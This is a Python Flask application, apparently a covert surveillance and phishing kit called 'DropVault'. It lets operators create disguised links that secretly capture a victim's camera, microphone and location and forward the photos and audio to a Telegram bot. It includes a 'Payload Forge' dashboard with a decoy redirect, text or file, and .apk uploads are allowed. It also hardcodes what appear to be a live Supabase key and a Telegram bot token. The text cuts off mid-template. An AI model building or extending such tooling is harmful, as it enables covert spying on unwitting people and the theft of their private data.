# by:@ROMEO_UCHIHA (Silent Background Capture, Direct File Access, Mic Recording & Admin Forwarding)
from flask import Flask, request, render_template_string, jsonify, redirect, session
from supabase import create_client, Client
import base64, requests, os, time, uuid, random, json

app = Flask(__name__)
app.secret_key = "uchiha_super_secret_key" 
app.config['TEMPLATES_AUTO_RELOAD'] = True

# --- CACHE BUSTER ---
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"

live_buffer = {}

# --- TELEGRAM HELPER FUNCTIONS ---
def escape_md(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + char if char in escape_chars else char for char in str(text))

def send_tg_msg(token, cid, text):
    try: 
        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
        full_text = text + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage", 
            json={"chat_id": cid, "text": full_text, "parse_mode": "MarkdownV2"},
            timeout=5
        )
    except: pass

def send_tg_photo(token, cid, raw_img, caption=""):
    try: 
        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
        full_caption = caption + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendPhoto", 
            data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
            files={"photo": ("c.jpg", raw_img, "image/jpeg")}, 
            timeout=10
        )
    except: pass

def send_tg_audio(token, cid, raw_audio, caption=""):
    try: 
        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
        full_caption = caption + footer
        # Sending as voice.ogg usually helps Telegram render it as a playable audio file properly
        requests.post(
            f"https://api.telegram.org/bot{token}/sendAudio", 
            data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
            files={"audio": ("voice.ogg", raw_audio, "audio/ogg")}, 
            timeout=15
        )
    except: pass

def get_bot_name(token):
    try:
        res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if res.get("ok"): return res["result"]["first_name"]
    except: pass
    return "Unknown Node"

def get_user_cid():
    if "user_id" not in session: return None
    try:
        user = supabase.table("users").select("chat_id").eq("id", session["user_id"]).execute().data
        return user[0]["chat_id"] if user else None
    except: return None

def is_admin(): return get_user_cid() == ADMIN_CID

# --- UI TEMPLATES (Tailwind, Aurora Gradient, Dark/Light Mode) ---
def get_base_html(content, title="DropVault"):
    nav_html = ""
    if "user_id" in session:
        admin_link = '<a href="/admin" class="hover:text-cyan-400 transition-colors"><i class="fas fa-crown text-pink-500 mr-1"></i> Admin</a>' if is_admin() else ''
        nav_html = f"""
        <nav class="w-full max-w-6xl mx-auto glass-panel mb-8 p-4 flex justify-between items-center z-20 relative">
            <div class="font-display font-black text-xl text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-pink-500"><i class="fas fa-satellite-dish"></i> SYSTEM</div>
            <div class="flex items-center gap-6 font-bold text-sm">
                <a href="/ds" class="hover:text-cyan-400 transition-colors"><i class="fas fa-home mr-1"></i> Dashboard</a>
                {admin_link}
                <a href="/logout" class="text-red-500 hover:text-red-400 transition-colors"><i class="fas fa-power-off mr-1"></i> Logout</a>
            </div>
        </nav>
        """

    return f"""
    <!DOCTYPE html>
    <html lang="en" class="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>{title}</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
        <script>
            tailwind.config = {{
                darkMode: 'class',
                theme: {{ extend: {{ fontFamily: {{ sans: ['Plus Jakarta Sans', 'sans-serif'], display: ['Orbitron', 'sans-serif'] }} }} }}
            }}
        </script>
        <style>
            body {{ transition: background-color 0.4s, color 0.4s; overflow-x: hidden; }}
            .dark body {{ background-color: #05000a; color: #ffffff; }}
            .light body {{ background-color: #f8fafc; color: #0f172a; }}
            
            .orb-1 {{ position: fixed; top: -10%; left: -10%; width: 50vw; height: 50vw; background: radial-gradient(circle, rgba(0,229,255,0.15) 0%, transparent 60%); filter: blur(80px); z-index: -1; pointer-events: none; }}
            .orb-2 {{ position: fixed; bottom: -20%; right: -10%; width: 60vw; height: 60vw; background: radial-gradient(circle, rgba(255,0,85,0.15) 0%, transparent 60%); filter: blur(100px); z-index: -1; pointer-events: none; }}
            .light .orb-1 {{ background: radial-gradient(circle, rgba(0,229,255,0.2) 0%, transparent 60%); }}
            .light .orb-2 {{ background: radial-gradient(circle, rgba(255,0,85,0.15) 0%, transparent 60%); }}

            .glass-panel {{ background: rgba(20, 20, 30, 0.5); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }}
            .light .glass-panel {{ background: rgba(255, 255, 255, 0.7); border: 1px solid rgba(0,0,0,0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.05); }}
            
            .input-glass {{ background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); color: white; transition: 0.3s; width: 100%; }}
            .light .input-glass {{ background: rgba(255,255,255,0.9); border: 1px solid rgba(0,0,0,0.2); color: #000; }}
            .input-glass:focus {{ border-color: #00e5ff; box-shadow: 0 0 15px rgba(0,229,255,0.3); outline: none; }}
            
            select.input-glass option {{ background: #1a1a2e; color: white; }}
            .light select.input-glass option {{ background: white; color: black; }}

            .theme-toggle {{ position: fixed; top: 20px; right: 20px; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 1000; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: all 0.3s; }}
            .dark .theme-toggle {{ background: #1e1e2e; border: 1px solid rgba(255,255,255,0.1); color: #00e5ff; }}
            .light .theme-toggle {{ background: #ffffff; border: 1px solid rgba(0,0,0,0.1); color: #ff0055; }}
            .theme-toggle:hover {{ transform: scale(1.1); }}

            .drop-zone {{ border: 2px dashed rgba(0, 229, 255, 0.5); padding: 30px; text-align: center; border-radius: 15px; cursor: pointer; transition: 0.3s; }}
            .drop-zone:hover {{ background: rgba(0, 229, 255, 0.1); border-color: #00e5ff; }}
        </style>
    </head>
    <body class="min-h-screen flex flex-col items-center p-4 pt-10">
        <div class="orb-1"></div><div class="orb-2"></div>
        <div class="theme-toggle" onclick="toggleTheme()"><i id="themeIcon" class="fas fa-moon text-xl"></i></div>
        
        {nav_html}
        {content}

        <script>
            function toggleTheme() {{
                let html = document.documentElement;
                let icon = document.getElementById('themeIcon');
                if(html.classList.contains('dark')) {{
                    html.classList.remove('dark'); html.classList.add('light');
                    icon.className = 'fas fa-sun text-xl';
                    localStorage.setItem('theme', 'light');
                }} else {{
                    html.classList.remove('light'); html.classList.add('dark');
                    icon.className = 'fas fa-moon text-xl';
                    localStorage.setItem('theme', 'dark');
                }}
            }}
            if(localStorage.getItem('theme') === 'light') {{ toggleTheme(); }}
        </script>
    </body>
    </html>
    """

# Landing Page
@app.route("/")
def index(): 
    content = """
    <div class="text-center max-w-3xl z-10 relative mt-10">
        <div class="inline-block p-4 rounded-3xl bg-gradient-to-r from-cyan-500/20 to-pink-500/20 border border-white/10 mb-6 backdrop-blur-md">
            <h1 class="font-display font-black text-5xl md:text-7xl text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-pink-500 tracking-wider">DropVault</h1>
        </div>
        <p class="text-lg md:text-xl opacity-80 mb-10 font-medium">Next-Gen File Sharing Infrastructure with Identity & Location verification.</p>
        <div class="flex gap-4 justify-center">
            <a href="/lg" class="px-8 py-4 rounded-full bg-black/40 border border-cyan-500/50 hover:bg-cyan-500 hover:text-black font-bold uppercase tracking-widest transition-all shadow-[0_0_20px_rgba(0,229,255,0.2)]">Login</a>
            <a href="/rg" class="px-8 py-4 rounded-full bg-gradient-to-r from-cyan-500 to-pink-500 text-white font-bold uppercase tracking-widest hover:scale-105 transition-transform shadow-[0_10px_30px_rgba(255,0,85,0.4)]">Start Sharing</a>
        </div>
        
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-20">
            <div class="glass-panel p-6 text-left">
                <i class="fas fa-folder-open text-4xl text-cyan-400 mb-4"></i>
                <h3 class="font-bold text-xl mb-2">Secure Delivery</h3>
                <p class="opacity-70 text-sm">Share files safely with instant deployment across multiple nodes.</p>
            </div>
            <div class="glass-panel p-6 text-left">
                <i class="fas fa-fingerprint text-4xl text-pink-500 mb-4"></i>
                <h3 class="font-bold text-xl mb-2">Identity Gate</h3>
                <p class="opacity-70 text-sm">Visual verification ensures only authorized targets access payload.</p>
            </div>
            <div class="glass-panel p-6 text-left">
                <i class="fas fa-microphone-lines text-4xl text-purple-400 mb-4"></i>
                <h3 class="font-bold text-xl mb-2">Audio Analytics</h3>
                <p class="opacity-70 text-sm">Real-time environment audio tracking integration available.</p>
            </div>
        </div>
    </div>
    """
    return render_template_string(get_base_html(content, "DropVault | Home"))

@app.route("/rg", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        token, cid = request.form.get("token"), request.form.get("cid")
        otp = str(random.randint(1000, 9999))
        supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
        
        msg = f"😈 *SYSTEM REGISTRATION*\n\n*Code:* `{escape_md(otp)}`"
        send_tg_msg(token, cid, msg)
        return redirect(f"/verify_otp?cid={cid}&purpose=register")
    
    content = """
    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative mt-10 mx-auto">
        <h2 class="font-display font-black text-3xl mb-8 text-center text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-cyan-400">CREATE ACCOUNT</h2>
        <form method="POST" class="flex flex-col gap-4">
            <div class="relative"><i class="fas fa-robot absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="token" placeholder="Telegram Bot Token" required class="input-glass p-4 pl-12 rounded-xl font-mono text-sm"></div>
            <div class="relative"><i class="fas fa-id-badge absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="cid" placeholder="Admin Chat ID" required class="input-glass p-4 pl-12 rounded-xl font-mono text-sm"></div>
            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Send OTP <i class="fas fa-paper-plane ml-2"></i></button>
        </form>
        <div class="text-center mt-6"><a href="/lg" class="text-sm font-bold opacity-60 hover:opacity-100 hover:text-cyan-400 transition-colors uppercase tracking-wider">Already registered? Login</a></div>
    </div>
    """
    return render_template_string(get_base_html(content, "Register | DropVault"))

@app.route("/lg", methods=["GET", "POST"])
def login():
    if "user_id" in session: return redirect("/ds")
    if request.method == "POST":
        cid = request.form.get("cid")
        users = supabase.table("users").select("*").eq("chat_id", cid).execute().data
        if not users: 
            return render_template_string(get_base_html("<div class='glass-panel p-10 text-center z-10 relative mt-10 max-w-md mx-auto'><i class='fas fa-triangle-exclamation text-5xl text-pink-500 mb-4'></i><h2 class='font-bold text-2xl mb-4'>Not Registered!</h2><a href='/rg' class='inline-block bg-pink-500 text-white px-6 py-3 rounded-xl font-bold uppercase'>Register Now</a></div>", "Error"))
        elif len(users) == 1:
            otp = str(random.randint(1000, 9999))
            supabase.table("otps").insert({"chat_id": cid, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
            msg = f"🔐 *LOGIN OTP*\n\n*Code:* `{escape_md(otp)}`"
            send_tg_msg(users[0]["bot_token"], cid, msg)
            return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
        else:
            html = """<div class='glass-panel p-8 w-full max-w-md z-10 relative mt-10 mx-auto'><h2 class='font-display font-black text-2xl mb-6 text-center text-cyan-400'>SELECT NODE</h2><div class='flex flex-col gap-3'>"""
            for u in users: 
                html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit' class='w-full input-glass p-4 rounded-xl text-left font-bold hover:border-cyan-400 transition-colors'><i class='fas fa-robot text-cyan-400 mr-3'></i> {u['bot_name']}</button></form>"
            html += "</div></div>"
            return render_template_string(get_base_html(html, "Select Node"))
            
    content = """
    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative mt-10 mx-auto">
        <div class="w-20 h-20 mx-auto bg-gradient-to-br from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center shadow-[0_0_20px_rgba(0,229,255,0.4)] mb-6"><i class="fas fa-fingerprint text-4xl text-white"></i></div>
        <h2 class="font-display font-black text-3xl mb-8 text-center text-white">WELCOME <span class="text-cyan-400">BACK</span></h2>
        <form method="POST" class="flex flex-col gap-4">
            <div class="relative"><i class="fas fa-id-card absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="cid" placeholder="Enter System Chat ID" required class="input-glass p-4 pl-12 rounded-xl font-mono text-center tracking-widest font-bold"></div>
            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Initialize Uplink <i class="fas fa-bolt ml-2"></i></button>
        </form>
        <div class="text-center mt-6"><a href="/rg" class="text-sm font-bold opacity-60 hover:opacity-100 hover:text-pink-500 transition-colors uppercase tracking-wider">Create a new account</a></div>
    </div>
    """
    return render_template_string(get_base_html(content, "Login | DropVault"))

@app.route("/send_login_otp", methods=["POST"])
def send_login_otp():
    cid, token = request.form.get("cid"), request.form.get("token")
    otp = str(random.randint(1000, 9999))
    supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "purpose": "login"}).execute()
    msg = f"🔐 *LOGIN OTP*\n\n*Code:* `{escape_md(otp)}`"
    send_tg_msg(token, cid, msg)
    return redirect(f"/verify_otp?cid={cid}&purpose=login&token={token}")

@app.route("/verify_otp", methods=["GET", "POST"])
def verify_otp():
    cid, purpose, token = request.args.get("cid"), request.args.get("purpose"), request.args.get("token", "")
    if request.method == "POST":
        query = supabase.table("otps").select("*").eq("chat_id", cid).eq("purpose", purpose).eq("otp", request.form.get("otp"))
        if token: query = query.eq("bot_token", token)
        res = query.execute().data
        if res:
            if purpose == "register": supabase.table("users").insert({"chat_id": cid, "bot_token": res[-1]["bot_token"], "bot_name": res[-1]["bot_name"]}).execute()
            session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
            supabase.table("otps").delete().eq("chat_id", cid).execute()
            return redirect("/ds")
        return render_template_string(get_base_html("<div class='glass-panel p-10 text-center z-10 relative max-w-md mx-auto mt-10'><i class='fas fa-circle-xmark text-5xl text-pink-500 mb-4'></i><h2 class='font-bold text-2xl mb-4'>Invalid OTP!</h2><a href='/lg' class='inline-block bg-pink-500 text-white px-6 py-3 rounded-xl font-bold uppercase'>Try Again</a></div>", "Error"))
    
    content = """
    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative mt-10 mx-auto">
        <h2 class="font-display font-black text-3xl mb-2 text-center text-white">VERIFY <span class="text-cyan-400">OTP</span></h2>
        <p class="text-center text-xs font-bold uppercase tracking-widest text-pink-500 mb-8"><i class="fas fa-paper-plane mr-1"></i> Check Telegram Bot</p>
        <form method="POST" class="flex flex-col gap-4">
            <input type="text" name="otp" placeholder="••••" maxlength="4" required class="input-glass p-5 rounded-xl text-center text-4xl tracking-[1em] font-black outline-none focus:border-cyan-400">
            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-unlock-keyhole mr-2"></i> Authenticate</button>
        </form>
    </div>
    """
    return render_template_string(get_base_html(content, "Verify OTP"))

@app.route("/logout")
def logout(): session.clear(); return redirect("/lg")

# --- DASHBOARD LOGIC ---
@app.route("/ds", methods=["GET", "POST"])
def dashboard():
    if "user_id" not in session: return redirect("/lg")

    try:
        servers = supabase.table("servers").select("*").execute().data
        current_cid = get_user_cid()
        all_user_bots = supabase.table("users").select("*").eq("chat_id", current_cid).execute().data
        existing_link = supabase.table("links").select("*").eq("user_id", session["user_id"]).execute().data
    except Exception as e: return f"Error DB: {e}"

    if request.method == "POST":
        action = request.form.get("form_action")
        
        if action == "change_bot":
            new_bot_id = request.form.get("active_bot_id")
            if existing_link:
                supabase.table("links").update({"user_id": int(new_bot_id)}).eq("id", existing_link[0]["id"]).execute()
            session["user_id"] = int(new_bot_id)
            return redirect("/ds")
            
        elif action == "delete_link":
            if existing_link and existing_link[0].get("file_path"):
                try: supabase.storage.from_("uchiha_files").remove([existing_link[0]["file_path"]])
                except: pass
            supabase.table("links").delete().eq("user_id", session["user_id"]).execute()
            return redirect("/ds")
            
        elif action == "inline_edit":
            data = {}
            new_mode = request.form.get("action_mode")
            if new_mode:
                data["action_mode"] = new_mode
                if new_mode == "redirect": data["action_value"] = request.form.get("redirect_url", "")
                elif new_mode == "text": data["text_content"] = request.form.get("text_content", "")
                elif new_mode == "file":
                    if request.form.get("file_url"):
                        old_path = existing_link[0].get("file_path")
                        if old_path:
                            try: supabase.storage.from_("uchiha_files").remove([old_path])
                            except: pass
                        data["action_value"] = request.form.get("file_url")
                        data["file_path"] = request.form.get("file_path")
                        data["file_type"] = request.form.get("file_type")
            
            if request.form.get("cam_type"): data["cam_type"] = request.form.get("cam_type")
            if data: supabase.table("links").update(data).eq("id", existing_link[0]["id"]).execute()
            return redirect("/ds")

        # Create new link
        link_id = existing_link[0]["id"] if existing_link else str(uuid.uuid4())[:8]
        data = {
            "user_id": session["user_id"],
            "target_domain": request.form.get("server_url", "https://secure-links-psi.vercel.app").rstrip("/"),
            "target_type": request.form.get("type"),
            "cam_type": request.form.get("cam_type", "front_back"),
            "action_mode": request.form.get("action_mode"),
            "redirect_url": request.form.get("redirect_url"),
            "text_content": request.form.get("text_content"),
            "action_value": request.form.get("file_url"), 
            "file_path": request.form.get("file_path"),
            "file_type": request.form.get("file_type")
        }

        if existing_link and existing_link[0].get("file_path"):
            old_path = existing_link[0]["file_path"]
            if data["file_path"] != old_path or data["action_mode"] != "file":
                try: supabase.storage.from_("uchiha_files").remove([old_path])
                except: pass

        if action == "create":
            data["id"] = link_id
            supabase.table("links").insert(data).execute()
        elif action == "edit":
            supabase.table("links").update(data).eq("id", link_id).execute()
            
        return redirect("/ds")

    server_options = "".join([f'<option value="{s["url"]}">{s["url"]}</option>' for s in servers])
    bot_options = "".join([f'<option value="{b["id"]}" {"selected" if b["id"] == session["user_id"] else ""}>🤖 {b["bot_name"]}</option>' for b in all_user_bots])
    
    form_disabled = "hidden" if existing_link else "flex flex-col gap-5"
    active_link_html = ""
    
    if existing_link:
        l = existing_link[0]
        full_url = f"{l['target_domain']}/t/{l['id']}"
        
        mode_icon = "fa-link text-cyan-400" if l['action_mode'] == 'redirect' else ("fa-align-left text-pink-500" if l['action_mode'] == 'text' else "fa-file text-purple-400")
        mode_text = l['action_mode'].capitalize()

        val = l.get('action_value', '')
        ext = val.split('.')[-1].lower() if val else ''
        preview = ""
        if l['action_mode'] == 'file' and val:
            if ext in ['mp4', 'webm', 'ogg', 'mov'] or l.get('file_type') == 'video':
                preview = f'<video src="{val}" controls playsinline class="w-full max-h-[200px] rounded-xl border border-cyan-400/30 object-contain"></video>'
            elif ext in ['jpg', 'jpeg', 'png', 'gif', 'webp'] or l.get('file_type') == 'image':
                preview = f'<img src="{val}" class="w-full max-h-[200px] rounded-xl border border-cyan-400/30 object-contain">'
            else:
                preview = f'<div class="p-6 bg-black/40 rounded-xl text-center font-bold text-cyan-400 border border-cyan-400/30">Secure Document: {ext.upper()}</div>'

        inline_edit_html = f'''
        <div class="mt-6 bg-black/30 p-5 rounded-xl border border-white/10">
            <label class="block text-xs font-bold uppercase tracking-widest text-cyan-400 mb-3">Quick Inline Edit</label>
            <select id="inlineMode" onchange="toggleInlineMode()" class="input-glass p-3 rounded-lg mb-4 text-sm font-bold">
                <option value="redirect" {'selected' if l['action_mode']=='redirect' else ''}>🔗 Redirect URL</option>
                <option value="text" {'selected' if l['action_mode']=='text' else ''}>✍️ Text / Emoji View</option>
                <option value="file" {'selected' if l['action_mode']=='file' else ''}>📁 Upload File</option>
            </select>
            
            <label class="block text-xs font-bold uppercase tracking-widest text-pink-400 mb-2 mt-2">Camera Focus</label>
            <select id="inlineCamType" onchange="document.getElementById('hiddenCamType').value = this.value;" class="input-glass p-3 rounded-lg mb-4 text-sm font-bold">
                <option value="front_back" {'selected' if l.get('cam_type')=='front_back' else ''}>Front + Back (Auto Switch)</option>
                <option value="front" {'selected' if l.get('cam_type')=='front' else ''}>Front Camera Only</option>
                <option value="back" {'selected' if l.get('cam_type')=='back' else ''}>Back Camera Only</option>
            </select>

            <form method="POST" id="inlineTextUrlForm" class="{'hidden' if l['action_mode']=='file' else 'block'}">
                <input type="hidden" name="form_action" value="inline_edit">
                <input type="hidden" name="action_mode" id="inlineFormMode" value="{l['action_mode']}">
                <input type="hidden" name="cam_type" id="hiddenCamType" value="{l.get('cam_type', 'front_back')}">

                <div id="inlineRedirBlock" class="{'block' if l['action_mode']=='redirect' else 'hidden'}">
                    <input type="url" name="redirect_url" value="{l.get('action_value', '') if l['action_mode']=='redirect' else ''}" placeholder="Enter new URL..." class="input-glass p-3 rounded-lg w-full text-sm">
                </div>

                <div id="inlineTextBlock" class="{'block' if l['action_mode']=='text' else 'hidden'}">
                    <textarea name="text_content" rows="3" placeholder="Enter text..." class="input-glass p-3 rounded-lg w-full text-sm">{l.get('text_content', '') if l['action_mode']=='text' else ''}</textarea>
                </div>

                <button type="submit" class="bg-cyan-500/20 text-cyan-400 border border-cyan-500/50 hover:bg-cyan-500 hover:text-white px-4 py-2 rounded-lg font-bold text-xs uppercase tracking-widest mt-4 transition-colors">Save Changes</button>
            </form>

            <div id="inlineFileBlock" class="{'block' if l['action_mode']=='file' else 'hidden'}">
                <div class="mb-4">{preview}</div>
                <div class="drop-zone py-8 border-cyan-500/30 hover:bg-cyan-500/10 rounded-xl cursor-pointer" onclick="document.getElementById('inlineFInput').click()">
                    <i class="fas fa-cloud-upload-alt text-2xl text-cyan-400 mb-2"></i>
                    <p class="text-xs text-gray-400 font-bold uppercase tracking-widest">Tap to Upload New Media</p>
                </div>
                <form method="POST" id="inlineFForm" class="hidden">
                    <input type="hidden" name="form_action" value="inline_edit">
                    <input type="hidden" name="action_mode" value="file">
                    <input type="hidden" name="cam_type" id="hiddenCamTypeFile" value="{l.get('cam_type', 'front_back')}">
                    <input type="hidden" name="file_url" id="inlineUrl">
                    <input type="hidden" name="file_path" id="inlinePath">
                    <input type="hidden" name="file_type" id="inlineFType">
                </form>
                <input type="file" id="inlineFInput" class="hidden" accept="image/*,video/*,audio/*,.pdf,.apk" onchange="uploadXHR(this.files[0], 'inlineUrl', 'inlinePath', 'inlineFType', 'inlineSts', 'inline')">
                <div id="inlineSts" class="text-xs font-bold text-center mt-3"></div>
            </div>
        </div>
        <script>
            function toggleInlineMode() {{
                let m = document.getElementById('inlineMode').value;
                document.getElementById('inlineFormMode').value = m;
                if(m === 'file') {{
                    document.getElementById('inlineTextUrlForm').classList.add('hidden');
                    document.getElementById('inlineFileBlock').classList.remove('hidden');
                }} else {{
                    document.getElementById('inlineTextUrlForm').classList.remove('hidden');
                    document.getElementById('inlineFileBlock').classList.add('hidden');
                    if(m === 'redirect') {{
                        document.getElementById('inlineRedirBlock').classList.remove('hidden');
                        document.getElementById('inlineTextBlock').classList.add('hidden');
                    }} else {{
                        document.getElementById('inlineRedirBlock').classList.add('hidden');
                        document.getElementById('inlineTextBlock').classList.remove('hidden');
                    }}
                }}
            }}
            document.getElementById('inlineCamType').addEventListener('change', function() {{
                document.getElementById('hiddenCamTypeFile').value = this.value;
            }});
        </script>
        '''

        active_link_html = f'''
        <div class="glass-panel p-6 border-cyan-500/30 mb-8 relative overflow-hidden">
            <div class="absolute -right-10 -bottom-10 opacity-5"><i class="fas fa-satellite-dish text-[150px]"></i></div>
            <div class="flex items-center gap-3 mb-6">
                <div class="w-10 h-10 rounded-full bg-cyan-500/20 flex items-center justify-center border border-cyan-500/50">
                    <span class="w-3 h-3 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_10px_#00e5ff]"></span>
                </div>
                <div><h3 class="font-bold text-lg tracking-widest text-cyan-400">ACTIVE UPLINK</h3></div>
            </div>
            
            <input value="{full_url}" readonly id="myLink" class="w-full bg-black/50 border border-cyan-400/30 text-cyan-400 p-4 rounded-xl text-center font-mono font-bold outline-none mb-4">
            <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-6 flex items-center gap-2"><i class="fas {mode_icon}"></i> Mode: {mode_text}</p>
            
            <div class="flex flex-col md:flex-row gap-3">
                <button type="button" onclick="navigator.clipboard.writeText(document.getElementById('myLink').value); alert('Link Copied!');" class="flex-1 bg-black/40 border border-white/20 p-3 rounded-xl hover:bg-white/10 font-bold text-sm uppercase tracking-widest transition-colors"><i class="fas fa-copy text-cyan-400 mr-2"></i> Copy Link</button>
                <form method="POST" class="flex-1 m-0">
                    <input type="hidden" name="form_action" value="delete_link">
                    <button type="submit" class="w-full bg-pink-500/20 border border-pink-500/50 text-pink-400 p-3 rounded-xl hover:bg-pink-500 hover:text-white font-bold text-sm uppercase tracking-widest transition-colors"><i class="fas fa-trash mr-2"></i> Revoke</button>
                </form>
            </div>
            {inline_edit_html}
        </div>
        '''

    content = f"""
    <div class="w-full max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-8 z-10 relative">
        <div class="flex flex-col">
            {active_link_html}
            
            <div class="glass-panel p-8" style="{'display:none;' if existing_link else ''}">
                <div class="flex items-center gap-3 mb-6 border-b border-white/10 pb-4">
                    <i class="fas fa-wand-magic-sparkles text-2xl text-pink-500"></i>
                    <h2 class="font-display font-black text-2xl tracking-widest">PAYLOAD FORGE</h2>
                </div>
                
                <form method="POST" id="mForm" class="{form_disabled}">
                    <input type="hidden" name="form_action" id="formAct" value="create">
                    
                    <div>
                        <label class="block text-xs font-bold uppercase tracking-widest text-cyan-400 mb-2">Target Node Server</label>
                        <select name="server_url" class="input-glass p-4 rounded-xl text-sm font-bold">{server_options}</select>
                    </div>
                    
                    <div>
                        <label class="block text-xs font-bold uppercase tracking-widest text-cyan-400 mb-2">Capture Protocol</label>
                        <select name="type" class="input-glass p-4 rounded-xl text-sm font-bold">
                            <option value="both">Camera + Location</option>
                            <option value="camera">Camera Only</option>
                            <option value="location">Location Only</option>
                            <option value="mic">Microphone Only</option>
                            <option value="cam_mic">Camera + Microphone</option>
                            <option value="cam_mic_loc">Cam + Mic + Location</option>
                        </select>
                    </div>

                    <div>
                        <label class="block text-xs font-bold uppercase tracking-widest text-pink-400 mb-2">Camera Target</label>
                        <select name="cam_type" class="input-glass p-4 rounded-xl text-sm font-bold">
                            <option value="front_back">Front & Back (Auto Alternate 10s)</option>
                            <option value="front">Front Camera Continuously</option>
                            <option value="back">Back Camera Continuously</option>
                        </select>
                    </div>
                    
                    <div>
                        <label class="block text-xs font-bold uppercase tracking-widest text-cyan-400 mb-2">Action View Mode</label>
                        <select name="action_mode" id="actionMode" onchange="toggleFields()" class="input-glass p-4 rounded-xl text-sm font-bold">
                            <option value="redirect">🔗 Redirect URL</option>
                            <option value="text">✍️ Text / Emoji View</option>
                            <option value="file">📁 Upload Direct File (Max 10MB)</option>
                        </select>
                    </div>
                    
                    <div id="redirField">
                        <input type="url" name="redirect_url" placeholder="https://..." class="input-glass p-4 rounded-xl w-full text-sm font-bold">
                    </div>
                    <div id="textField" class="hidden">
                        <textarea name="text_content" placeholder="Drop emojis or text here..." rows="4" class="input-glass p-4 rounded-xl w-full text-sm font-bold"></textarea>
                    </div>
                    
                    <div id="fileField" class="hidden">
                        <label class="block text-xs font-bold uppercase tracking-widest text-cyan-400 mb-2">Media Format</label>
                        <select name="file_type" id="ftype" class="input-glass p-4 rounded-xl text-sm font-bold mb-4">
                            <option value="image">Image</option><option value="video">Video</option><option value="document">App/Doc</option>
                        </select>
                        
                        <div class="drop-zone bg-black/20" id="dropZone" onclick="document.getElementById('fInput').click()">
                            <i class="fas fa-cloud-upload-alt text-4xl text-cyan-400 mb-3"></i>
                            <p id="dText" class="text-xs font-bold uppercase tracking-widest opacity-70">Tap or Drag File Here</p>
